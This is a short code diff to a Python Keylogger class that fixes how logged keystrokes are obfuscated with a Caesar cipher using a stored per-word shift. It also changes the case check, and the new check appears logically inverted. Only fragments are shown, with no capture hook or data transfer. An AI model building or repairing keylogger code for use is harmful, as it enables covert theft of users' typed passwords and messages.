@@ -76,7 +76,7 @@ class Keylogger:
                 self.shift = random.randint(1,26)
                 self.shifted[self.index] = self.shift
             self.sameword = True
-            c = self.caesar_cipher_encrypt(c, random.randint(1,26))
+            c = self.caesar_cipher_encrypt(c, self.shift)
             self.logged += c
 
             
@@ -142,7 +142,7 @@ class Keylogger:
             self.write()
 
     def caesar_cipher_encrypt(self, char, shift):
-        if char.isupper:
+        if ord(char) > 96:
             result = chr((ord(char) + shift - 65) % 26 + 65)
             # Encrypt lowercase characters in plain text
         else:
